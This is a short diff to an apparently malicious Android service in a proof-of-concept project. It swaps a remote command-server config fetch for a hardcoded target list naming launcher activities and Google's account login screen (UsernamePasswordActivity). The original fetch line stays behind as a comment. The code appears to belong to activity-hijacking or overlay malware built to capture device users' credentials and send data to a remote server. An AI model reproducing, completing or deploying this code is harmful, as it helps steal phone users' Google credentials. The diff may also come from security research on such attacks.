@@ -252,7 +252,15 @@ public class MainService extends Service {
     }
 
 	private void getConfig() {
-		new HttpAsyncTask().execute("http://"+HttpDataSender.server+":"+HttpDataSender.server_port+"/"+HttpDataSender.config_file);
+		
+		//For this poc let's not setup a server, but simulate it:
+		configReceived("pig,com.android.launcher,com.....!!!\n"+
+				"pig,com.android.launcher,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS!!!\n"+
+				"pig,com.lge.launcher2,com.lge.launcher2.Launcher!!!\n"+
+				"pig,com.lge.launcher2,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS!!!\n"+
+				"nope,com.google.android.gsf.login,com.google.android.gsf.login.UsernamePasswordActivity!!!\n"+
+				"nope,com.google.android.gsf.login,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS");
+		//new HttpAsyncTask().execute("http://"+HttpDataSender.server+":"+HttpDataSender.server_port+"/"+HttpDataSender.config_file);
 	}
 	
 	private static String convertInputStreamToString(InputStream inputStream) throws IOException{
